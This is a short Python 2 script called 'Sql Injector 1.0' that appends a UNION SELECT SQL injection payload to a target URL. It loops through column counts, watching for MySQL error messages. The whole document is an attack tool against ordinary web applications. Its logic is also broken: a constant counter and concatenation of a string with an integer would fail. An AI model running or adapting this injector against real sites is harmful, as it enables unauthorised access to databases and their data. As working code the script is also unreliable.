import sys,os,re,urllib,urllib2,socket

if len(sys.argv)<2:
	print "\n beenudel1986[at]gmail[dot]com"
	print "\n\tSql Injector 1.0"
	print "\n Usage: sqlinjector.py <site>"
	sys.exit(0)

host=sys.argv[1]
var1="/*"
ERRORS = ["Warning: mysql_fetch_row()","You have an error in your SQL syntax","doesn't exist"]
payload="-1+union+select+1"
site=host+payload
for i in range(1,100): # column number range
	try: 
		attack= urllib2.urlopen(site+var1, "80").readlines()
		print "Trying Payload: ",site+var1,"\n"
		j=1+1
		for line in attack:
			if re.search("Warning: mysql_fetch_row()",line):
				print "\n Trying Next"
				site=site+payload+j
				break
			
				
	except(urllib2.URLError, socket.timeout, socket.gaierror, socket.error): 
		pass 
	except(KeyboardInterrupt): 
		pass